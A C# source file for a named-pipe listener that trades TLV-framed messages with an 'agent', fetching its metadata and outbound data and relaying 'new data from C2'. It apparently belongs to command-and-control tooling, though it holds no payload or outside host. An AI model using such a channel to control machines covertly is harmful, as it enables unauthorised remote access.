using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using System.IO;

namespace ExecUnitUtils
{
    internal class CommunicationNamedPipesListener : CommunicationNamedPipes
    {
        protected const byte MessageTypeCallback = 0x20;
        protected const byte MessageTypeResponse1 = 0x21;
        protected const byte MessageTypeResponse2 = 0x22;
        protected const byte MessageTypeNewData = 0x23;
        protected const byte ChildTypeCommand = 0x1;
        protected const byte ChildTypeSeqNr = 0x2;
        protected const byte ChildTypeData = 0x4;
        protected int _seqNr;
        Action<byte[]> _callback;
        protected readonly Dictionary<int, TLV> _responses;
        protected readonly Dictionary<int, EventWaitHandle> _signals;
        protected readonly object _responseLock;


        /// <summary>
        /// Initializes a new instance with the pipe name and optional callback.
        /// </summary>
        public CommunicationNamedPipesListener(string pipeName, Action<byte[]> callback) : base(pipeName)
        {
            _responses = new Dictionary<int, TLV>();
            _signals = new Dictionary<int, EventWaitHandle>();
            _responseLock = new object();
            _seqNr = 1;
            _callback = callback;
        }


        /// <summary>
        /// Sets or updates the callback for incoming data messages
        /// </summary>
        /// 
        public void SetCallback(Action<byte[]> callback)
        {
            _callback = callback;
        }

        /// <summary>
        /// Gets metadata from the agent.
        /// </summary>
        /// <returns>Metadata or null on failure.</returns>
        public byte[] GetMetadata()
        {
            if (!_active) return null;
            try
            {
                int seq = GetNextSeqNr();
                TLV tlv = new TLV(MessageTypeResponse1);
                tlv.AddChild(new TLV(ChildTypeCommand, new byte[] { 0x1 }));
                tlv.AddChild(new TLV(ChildTypeSeqNr, BitConverter.GetBytes(seq)));
                PutData(tlv.GetFullBuffer());
                return WaitForResponseData(seq, Timeout.Infinite);
            }
            catch (IOException)
            {
                return null;
            }
        }

        /// <summary>
        /// Gets data to send from the agent.
        /// </summary>
        /// <returns>Data or null on failure.</returns>
        public byte[] GetDataToSend()
        {
            if (!_active) return null;
            try
            {
                int seq = GetNextSeqNr();
                TLV tlv = new TLV(MessageTypeResponse2);
                tlv.AddChild(new TLV(ChildTypeCommand, new byte[] { 0x1 }));
                tlv.AddChild(new TLV(ChildTypeSeqNr, BitConverter.GetBytes(seq)));
                PutData(tlv.GetFullBuffer());
                return WaitForResponseData(seq, Timeout.Infinite);
            }
            catch (IOException)
            {
                return null;
            }
        }

        /// <summary>
        /// Sends new data from C2.
        /// </summary>
        /// <param name="data">Data to send.</param>
        /// <returns>True if sent.</returns>
        public bool NewDataFromC2(byte[] data)
        {
            if (!_active) return false;
            try
            {
                TLV tlv = new TLV(MessageTypeNewData, data);
                return PutData(tlv.GetFullBuffer());
            }
            catch (IOException)
            {
                return false;
            }
        }

        override protected bool HandleIncomingData(TLV tlv)
        {
            if (tlv.Type == MessageTypeCallback && _callback != null)
            {
                var child = tlv.GetChild(ChildTypeData, 0);
                var childData = child != null ? child.GetAsBytes() : null;
                if (childData != null)
                    _callback(childData);
                return true;
            }

            var seqChild = tlv.GetChild(ChildTypeSeqNr, 0);
            if ((tlv.Type == MessageTypeResponse1 || tlv.Type == MessageTypeResponse2) && seqChild != null)
            {
                int? id = seqChild.GetAsInt32();
                if (id.HasValue)
                {
                    lock (_responseLock)
                    {
                        _responses[id.Value] = tlv;
                        EventWaitHandle signal;
                        if (_signals.TryGetValue(id.Value, out signal))
                            signal.Set();
                    }
                }
                return true;
            }
            return false;
        }

        protected byte[] WaitForResponseData(int id, int timeoutMs)
        {
            EventWaitHandle signal;
            lock (_responseLock)
            {
                TLV resp;
                if (_responses.TryGetValue(id, out resp))
                {
                    _responses.Remove(id);
                    _signals.Remove(id);
                    var child = resp.GetChild(ChildTypeData, 0);
                    return child != null ? child.GetAsBytes() : null;
                }
                signal = new EventWaitHandle(false, EventResetMode.AutoReset);
                _signals[id] = signal;
            }

            if (!signal.WaitOne(timeoutMs))
            {
                lock (_responseLock)
                {
                    _signals.Remove(id);
                }
                return null;
            }

            lock (_responseLock)
            {
                TLV resp;
                if (_responses.TryGetValue(id, out resp))
                {
                    _responses.Remove(id);
                    var child = resp.GetChild(ChildTypeData, 0);
                    return child != null ? child.GetAsBytes() : null;
                }
                return null;
            }
        }

        protected int GetNextSeqNr()
        {
            lock (_sendLock)
            {
                return _seqNr++;
            }
        }

        new public void Dispose()
        {
            base.Dispose();
            lock (_responseLock)
            {
                foreach (var sig in _signals.Values)
                    sig.Dispose();
                _signals.Clear();
                _responses.Clear();
            }
        }
    }
}
